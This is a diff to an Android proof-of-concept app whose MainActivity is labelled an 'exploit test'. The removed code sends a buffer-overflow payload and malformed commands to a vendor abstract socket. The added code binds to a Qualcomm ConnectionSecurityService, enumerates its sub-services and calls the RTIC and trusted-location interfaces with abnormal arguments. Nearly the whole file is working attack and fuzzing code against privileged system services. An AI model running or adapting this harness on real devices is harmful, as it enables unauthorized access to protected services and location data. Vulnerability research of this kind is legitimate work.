@@ -1,14 +1,17 @@
 package com.example.tzpoc;
 
-import android.Manifest;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
-import android.net.LocalSocket;
-import android.net.LocalSocketAddress;
-import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
+import android.os.IBinder;
 import android.os.Looper;
+import android.os.Parcel;
+import android.os.RemoteException;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
@@ -16,11 +19,14 @@ import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+
+import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
+import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
+import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
+
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.nio.charset.StandardCharsets;
@@ -32,14 +38,40 @@ import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MainActivity extends AppCompatActivity {
-    private static final int PERMISSION_REQUEST_CODE = 100;
+    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.connectionsecurity";
+    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
+
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
+    private IServiceManager mServiceManager;
+    private boolean isBound = false;
     private AtomicBoolean isTesting = new AtomicBoolean(false);
     private AtomicBoolean stopRequested = new AtomicBoolean(false);
     private Thread testThread;
+
+    private ServiceConnection serviceConnection = new ServiceConnection() {
+        @Override
+        public void onServiceConnected(ComponentName name, IBinder service) {
+            mServiceManager = IServiceManager.Stub.asInterface(service);
+            appendLog("Service bound to ConnectionSecurityService");
+            updateStatus("Bound - starting tests");
+            enableButtons(false, true);
+            stopRequested.set(false);
+            testThread = new Thread(() -> executeFullTest());
+            testThread.start();
+        }
+
+        @Override
+        public void onServiceDisconnected(ComponentName name) {
+            appendLog("Service disconnected");
+            mServiceManager = null;
+            isBound = false;
+            enableButtons(true, false);
+            updateStatus("Disconnected");
+        }
+    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -50,19 +82,13 @@ public class MainActivity extends AppCompatActivity {
         btnStart = findViewById(R.id.btn_start);
         btnStop = findViewById(R.id.btn_stop);
 
-        requestNecessaryPermissions();
+        requestPermissions();
 
         btnStart.setOnClickListener(v -> {
-            if (!isTesting.get()) {
-                stopRequested.set(false);
-                isTesting.set(true);
-                enableButtons(false, true);
-                testThread = new Thread(() -> executeFullTest());
-                testThread.start();
-            }
+            if (!isBound && !isTesting.get()) bindService();
         });
         btnStop.setOnClickListener(v -> {
-            if (isTesting.get()) {
+            if (isBound || isTesting.get()) {
                 stopRequested.set(true);
                 if (testThread != null) testThread.interrupt();
                 enableButtons(false, false);
@@ -76,38 +102,38 @@ public class MainActivity extends AppCompatActivity {
         appendLog("App started. Press 'Start' to begin.");
     }
 
-    private void requestNecessaryPermissions() {
-        List<String> needed = new ArrayList<>();
-        needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-        needed.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            needed.add(Manifest.permission.READ_MEDIA_IMAGES);
-            needed.add(Manifest.permission.READ_MEDIA_VIDEO);
-            needed.add(Manifest.permission.READ_MEDIA_AUDIO);
-            needed.add(Manifest.permission.POST_NOTIFICATIONS);
-        }
-        List<String> toRequest = new ArrayList<>();
-        for (String perm : needed) {
-            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                toRequest.add(perm);
+    private void requestPermissions() {
+        String[] perms = {
+                android.Manifest.permission.READ_EXTERNAL_STORAGE,
+                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                android.Manifest.permission.ACCESS_FINE_LOCATION
+        };
+        for (String p : perms) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, perms, 100);
+                break;
             }
-        }
-        if (!toRequest.isEmpty()) {
-            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         }
     }
 
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            for (int i = 0; i < permissions.length; i++) {
-                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
-                    appendLog("Granted: " + permissions[i]);
-                } else {
-                    appendLog("Denied: " + permissions[i]);
-                }
+    private void bindService() {
+        try {
+            Intent intent = new Intent();
+            intent.setClassName(TARGET_PKG, TARGET_CLS);
+            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
+            if (ret) {
+                appendLog("Binding service...");
+                updateStatus("Binding...");
+                isBound = true;
+            } else {
+                appendLog("bindService returned false");
+                updateStatus("Bind failed");
+                enableButtons(true, false);
             }
+        } catch (Exception e) {
+            appendLog("Bind exception: " + e.toString());
+            updateStatus("Exception");
+            enableButtons(true, false);
         }
     }
 
@@ -119,8 +145,39 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void executeFullTest() {
-        appendLog("========== Kerr Socket Exploit Test ==========");
-        testKerrSocket();
+        isTesting.set(true);
+        appendLog("========== ConnectionSecurityService Exploit Test ==========");
+
+        // サービス名候補（コードから推測）
+        String[] serviceNames = {
+                "rtic",
+                "RticService",
+                "com.qualcomm.qti.qms.connectionsecuritysdk.RticService",
+                "tloc",
+                "TlocService",
+                "com.qualcomm.qti.qms.connectionsecuritysdk.TlocService",
+                "wifi",
+                "WifiAuditor",
+                "cellular",
+                "dns",
+                "certificate",
+                "arp",
+                "update"
+        };
+
+        for (String name : serviceNames) {
+            if (stopRequested.get()) break;
+            testService(name);
+        }
+
+        // RticService と TlocService が特定できたら、詳細テスト
+        if (mRticBinder != null) {
+            testRtic();
+        }
+        if (mTlocBinder != null) {
+            testTloc();
+        }
+
         appendLog("========== ALL TESTS COMPLETED ==========");
         updateStatus("Done");
         isTesting.set(false);
@@ -128,103 +185,117 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    private void testKerrSocket() {
-        String socketName = "android:kc_log";
-        appendLog("Connecting to abstract socket: " + socketName);
-        LocalSocket socket = null;
+    private IBinder mRticBinder = null;
+    private IBinder mTlocBinder = null;
+
+    private void testService(String serviceName) {
+        if (mServiceManager == null) return;
+        appendLog("Trying to get service: " + serviceName);
         try {
-            socket = new LocalSocket();
-            socket.connect(new LocalSocketAddress(socketName, LocalSocketAddress.Namespace.ABSTRACT));
-            appendLog("Connected successfully!");
+            int[] status = new int[1];
+            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
+            if (binder != null) {
+                appendLog("  SUCCESS: Got binder for " + serviceName + ", status=" + status[0]);
+                try {
+                    String descriptor = binder.getInterfaceDescriptor();
+                    appendLog("  Interface descriptor: " + descriptor);
+                    if (descriptor.contains("IRticService")) {
+                        mRticBinder = binder;
+                    } else if (descriptor.contains("ITlocService")) {
+                        mTlocBinder = binder;
+                    }
+                } catch (Exception e) {
+                    appendLog("  Could not get descriptor: " + e.getMessage());
+                }
+            } else {
+                appendLog("  FAIL: getService returned null, status=" + status[0]);
+            }
+        } catch (RemoteException e) {
+            appendLog("  RemoteException: " + e.getMessage());
+        }
+    }
 
-            OutputStream os = socket.getOutputStream();
-            InputStream is = socket.getInputStream();
-
-            // 1. 空データ送信（a.a(4, null) の模倣）
-            appendLog("Sending empty command (type 4)");
-            os.write(4);
-            os.flush();
-            logResponse(is);
-
-            // 2. バッテリー情報を模倣 (a.a(short, byte[]) の形式を真似る)
-            //    実際には a.a(short s, byte[] bArr) は timestamp + s を送る
-            //    ここでは適当なデータを送る
-            appendLog("Sending fake battery data (type 41)");
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            baos.write(41); // command type
-            // timestamp 8 bytes (year, month, day, hour, minute, second)
+    private void testRtic() {
+        appendLog("--- Testing IRticService ---");
+        IRticService rtic = IRticService.Stub.asInterface(mRticBinder);
+        if (rtic == null) {
+            appendLog("  Failed to cast to IRticService");
+            return;
+        }
+        try {
+            // 正常な呼び出し
+            int[] status = new int[1];
+            int[] ret = new int[1];
             long now = System.currentTimeMillis();
-            baos.write(toByteArray((int)now));
-            baos.write(toByteArray((int)(now >> 32)));
-            // dummy data
-            baos.write("BATTERY_LOW".getBytes(StandardCharsets.US_ASCII));
-            os.write(baos.toByteArray());
-            os.flush();
-            logResponse(is);
-
-            // 3. 長大なペイロードを送信（バッファオーバーフロー狙い）
-            appendLog("Sending large payload (5000 bytes)");
-            byte[] large = new byte[5000];
-            for (int i = 0; i < large.length; i++) large[i] = (byte)0x41;
-            os.write(large);
-            os.flush();
-            logResponse(is);
-
-            // 4. 異常なコマンドコード (0xFF)
-            appendLog("Sending invalid command code 0xFF");
-            os.write(0xFF);
-            os.flush();
-            logResponse(is);
-
-            // 5. 抽象ソケットに書き込んだ後、何か読み取れるか
-            appendLog("Reading any response (timeout 1000ms)");
-            byte[] buf = new byte[1024];
-            long start = System.currentTimeMillis();
-            while (System.currentTimeMillis() - start < 1000 && is.available() == 0) {
-                Thread.sleep(50);
-            }
-            if (is.available() > 0) {
-                int len = is.read(buf);
-                if (len > 0) {
-                    String resp = new String(buf, 0, len, StandardCharsets.UTF_8);
-                    appendLog("Response received: " + resp);
-                }
-            } else {
-                appendLog("No response received.");
+            appendLog("  Calling getRticData with timestamp=" + now);
+            byte[] data = rtic.getRticData(now, status, ret, false);
+            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
+            if (data != null && data.length > 0) {
+                String hex = bytesToHex(data, 64);
+                appendLog("  First 64 bytes: " + hex);
             }
 
-            socket.close();
-            appendLog("Socket closed.");
+            // 異常値: 負のタイムスタンプ
+            appendLog("  Calling getRticData with timestamp=-1");
+            data = rtic.getRticData(-1, status, ret, false);
+            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
+
+            // 巨大なタイムスタンプ
+            appendLog("  Calling getRticData with timestamp=Long.MAX_VALUE");
+            data = rtic.getRticData(Long.MAX_VALUE, status, ret, false);
+            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
+
+            // フォーマット指定 (z=true)
+            appendLog("  Calling getRticData with z=true");
+            data = rtic.getRticData(now, status, ret, true);
+            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
+            if (data != null && data.length > 0) {
+                String str = new String(data, StandardCharsets.ISO_8859_1);
+                appendLog("  Data as string: " + str.substring(0, Math.min(200, str.length())));
+            }
+        } catch (RemoteException e) {
+            appendLog("  RemoteException: " + e.getMessage());
         } catch (Exception e) {
-            appendLog("Error: " + e.getClass().getSimpleName() + " - " + e.getMessage());
-            if (socket != null) try { socket.close(); } catch (Exception ignored) {}
+            appendLog("  Exception: " + e.toString());
         }
     }
 
-    private void logResponse(InputStream is) {
+    private void testTloc() {
+        appendLog("--- Testing ITlocService ---");
+        ITlocService tloc = ITlocService.Stub.asInterface(mTlocBinder);
+        if (tloc == null) {
+            appendLog("  Failed to cast to ITlocService");
+            return;
+        }
         try {
-            if (is.available() > 0) {
-                byte[] buf = new byte[is.available()];
-                int len = is.read(buf);
-                if (len > 0) {
-                    String resp = new String(buf, 0, len, StandardCharsets.UTF_8);
-                    appendLog("  Response: " + resp);
-                }
-            } else {
-                appendLog("  No immediate response.");
+            int[] status = new int[1];
+            int[] ret = new int[1];
+            appendLog("  Calling getTrustedLocation");
+            byte[] data = tloc.getTrustedLocation(status, ret);
+            appendLog("  status=" + status[0] + ", ret=" + ret[0] + ", data length=" + (data != null ? data.length : 0));
+            if (data != null && data.length > 0) {
+                String str = new String(data, StandardCharsets.UTF_8);
+                appendLog("  Data: " + str);
             }
+
+            appendLog("  Calling tlocWarmUp");
+            int warmup = tloc.tlocWarmUp();
+            appendLog("  tlocWarmUp returned: " + warmup);
+        } catch (RemoteException e) {
+            appendLog("  RemoteException: " + e.getMessage());
         } catch (Exception e) {
-            appendLog("  Read error: " + e.getMessage());
+            appendLog("  Exception: " + e.toString());
         }
     }
 
-    private byte[] toByteArray(int value) {
-        return new byte[] {
-            (byte)(value & 0xFF),
-            (byte)((value >> 8) & 0xFF),
-            (byte)((value >> 16) & 0xFF),
-            (byte)((value >> 24) & 0xFF)
-        };
+    private String bytesToHex(byte[] bytes, int max) {
+        StringBuilder sb = new StringBuilder();
+        int limit = Math.min(bytes.length, max);
+        for (int i = 0; i < limit; i++) {
+            sb.append(String.format("%02x", bytes[i] & 0xFF));
+        }
+        if (bytes.length > max) sb.append("...");
+        return sb.toString();
     }
 
     private void appendLog(final String msg) {
@@ -251,9 +322,9 @@ public class MainActivity extends AppCompatActivity {
                 appendLog("Cannot create Download dir");
                 return;
             }
-            File file = new File(dir, "kerr_socket_poc_log.txt");
+            File file = new File(dir, "connsec_exploit_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== Kerr Socket PoC Log ===");
+                pw.println("=== ConnectionSecurity Exploit Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
@@ -270,6 +341,9 @@ public class MainActivity extends AppCompatActivity {
         super.onDestroy();
         stopRequested.set(true);
         if (testThread != null) testThread.interrupt();
+        if (isBound) {
+            try { unbindService(serviceConnection); } catch (Exception ignored) {}
+        }
         saveLog();
     }
 }
